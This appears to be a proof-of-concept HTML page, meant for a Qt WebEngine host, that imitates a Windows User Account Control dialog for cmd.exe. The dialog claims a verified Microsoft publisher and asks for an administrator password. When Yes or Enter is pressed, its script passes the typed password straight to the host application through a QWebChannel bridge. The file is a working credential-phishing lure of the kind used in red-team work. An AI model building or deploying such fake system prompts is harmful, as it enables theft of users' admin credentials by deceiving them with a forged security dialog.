<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Windows UAC Prompt - POC</title>
  <style>
    :root {
      --titlebar-bg: #e8e8e8;
      --accent: #0078d4;
      --text: #000;
      --muted: #323130;
      --border: #e5e5e5;
      --controls-hover: #f0f0f0;
      --button-bg: #f3f2f1;
      --close-hover: #e81123;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
      -webkit-font-smoothing: antialiased;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f3f3f3;
      color: var(--text);
    }

    .window {
      width: 460px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.18);
      overflow: hidden;
      border: 1px solid var(--border);
    }

    /* Titlebar */
    .titlebar {
      background: var(--titlebar-bg);
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 0 0 12px;
      user-select: none;
    }

    .title {
      font-size: 12px;
      color: var(--text);
    }

    .window-controls {
      display: flex;
      align-items: center;
      height: 100%;
    }

    .control-btn {
      width: 46px;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      border: none;
      background: none;
      color: #666;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.15s, color 0.15s, box-shadow 0.15s;
    }

    .control-btn:hover {
      background: var(--controls-hover);
    }

    .close:hover {
      background: var(--close-hover);
      color: #fff;
      box-shadow: 0 0 8px rgba(232, 17, 35, 0.6);
    }

    /* Question banner */
    .uac-question-banner {
      background: var(--titlebar-bg);
      padding: 16px 20px;
      width: 100%;
    }

    .uac-question {
      font-size: 17px;
      font-weight: 700;
      line-height: 1.5;
      color: var(--muted);
    }

    /* App info */
    .uac-app-info {
      background: #fff;
      padding: 16px 20px;
      border: none;
      margin-bottom: 20px;
    }

    .app-header {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 8px;
    }

    .app-icon {
      width: 48px;
      height: 48px;
      border-radius: 6px;
      overflow: hidden;
      flex-shrink: 0;
      background: #fff;
    }

    .app-icon img {
      display: block;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .app-name {
      font-weight: 600;
      font-size: 15px;
      color: var(--text);
    }

    .uac-publisher {
      font-size: 13px;
      color: var(--muted);
      margin-bottom: 8px;
    }

    .uac-show-details {
      color: var(--accent);
      font-size: 13px;
      text-decoration: none;
      cursor: pointer;
      transition: color 0.15s;
    }

    .uac-show-details:hover {
      text-decoration: underline;
      color: #005a9e;
    }

    /* Credentials */
    .uac-credentials {
      padding: 0 20px 12px;
    }

    .uac-credential-title {
      font-size: 14px;
      margin: 8px 0;
      color: var(--text);
    }

    .uac-input-group {
      margin-bottom: 12px;
    }

    .uac-input {
      width: 100%;
      padding: 8px 12px;
      border: 1px solid #8a8886;
      border-radius: 8px;
      font-size: 14px;
      background: #fff;
      transition: border-color 0.15s, box-shadow 0.15s;
    }

    .uac-input:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.25);
    }

    .uac-more-choices-container {
      margin-top: 32px;
    }

    .uac-more-choices-container a {
      font-size: 13px;
      color: var(--accent);
      text-decoration: none;
      cursor: pointer;
    }

    .uac-more-choices-container a:hover {
      text-decoration: underline;
    }

    /* Buttons */
    .uac-buttons {
      display: flex;
      justify-content: flex-end;
      gap: 10px;
      padding: 16px 20px;
      background: #f3f3f3;
      border-top: 1px solid var(--border);
    }

    .uac-button {
      flex: 1;
      padding: 8px 24px;
      border: 1px solid #8a8886;
      border-radius: 4px;
      background: var(--button-bg);
      cursor: pointer;
      font-size: 14px;
      height: 40px;
      transition: all 0.1s ease;
    }

    .uac-button:hover {
      background: #e1e1e1;
    }

    .uac-button:active {
      transform: translateY(1px);
    }

    .uac-button.no {
      background: var(--accent);
      color: #fff;
      border-color: var(--accent);
    }

    .uac-button.no:hover {
      background: #106ebe;
      border-color: #106ebe;
    }

    .muted {
      color: var(--muted);
      font-size: 13px;
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="window" role="dialog">
    <div class="titlebar">
      <div class="title">User Account Control</div>
      <div class="window-controls">
        <button class="control-btn close" aria-label="Close" onclick="handleClose()">✕</button>
      </div>
    </div>

    <div class="content">
      <div class="uac-question-banner">
        <div class="uac-question">Do you want to allow this app to make changes to your device?</div>
      </div>

      <div class="uac-app-info">
        <div class="app-header">
          <div class="app-icon">
            <img src="assets/icon.png" alt="App icon">
          </div>
          <div class="app-name">Windows Command Processor</div>
        </div>
        <div class="uac-publisher">Verified publisher: Microsoft Windows</div>
        <a href="#" class="uac-show-details" id="show-details" onclick="toggleDetails(event)">
          Show more details
        </a>
        <div id="details" class="muted hidden" style="margin-top:10px;">
          File origin: Hard drive on this computer<br>
          Path: C:\Windows\System32\cmd.exe
        </div>
      </div>

      <div class="uac-credentials">
        <div class="uac-credential-title">
          To continue, enter an admin username and password
        </div>
        <div class="uac-input-group">
          <input id="password" class="uac-input" type="password" placeholder="Password" autofocus>
        </div>
        <div class="uac-more-choices-container">
          <a>More choices</a>
        </div>
      </div>
    </div>

    <div class="uac-buttons">
      <button class="uac-button" onclick="handleYes()">Yes</button>
      <button class="uac-button no" onclick="handleNo()">No</button>
    </div>
  </div>

  <script src="qrc:///qtwebchannel/qwebchannel.js"></script>
  <script>
    let bridge;

    window.passwordentry = document.querySelector('.uac-input');
    const uacinput = document.getElementById("password")

    uacinput.focus()

    new QWebChannel(qt.webChannelTransport, function(channel) {
        bridge = channel.objects.bridge;
    });

    function handleYes() {
        const password = window.passwordentry.value;
        if (bridge) {
            bridge.on_yes(password); // Pass password directly
        }
    }

    function handleNo() {
        if (bridge) bridge.on_no();
    }

    uacinput.addEventListener("keydown", function(event) {
    if (event.key === "Enter") {
        event.preventDefault(); // optional — prevents form submission
        handleYes()
    }
    });
    /*
    function handleYes() {
        const email = document.querySelector('input[type="text"]').value;
        const password = document.querySelector('input[type="password"]').value;
        
        if (!email || !password) {
            document.getElementById('warningMessage').style.display = 'block';
            return;
        }
        
        alert('UAC: Admin credentials accepted');
        document.querySelector('.window').style.display = 'none';
    }
    
    function handleNo() {
        document.querySelector('.window').style.display = 'none';
    }
    */

    function handleClose() {
        handleNo();
    }

    /*
    document.querySelector('.uac-show-details').addEventListener('click', function() {
        alert('Additional details:\n• File: cmd.exe\n• Digital signature: Valid\n• Origin: Windows system file\n• File version: 10.0.19041.1\n• Copyright: Microsoft Corporation');
    });

    document.querySelector('.uac-more-choices').addEventListener('click', function() {
        alert('More choices would show additional sign-in options such as:\n• Use a different Microsoft account\n• Use Windows Hello\n• Use a security key');
    });
    */
  </script>

</body>
</html>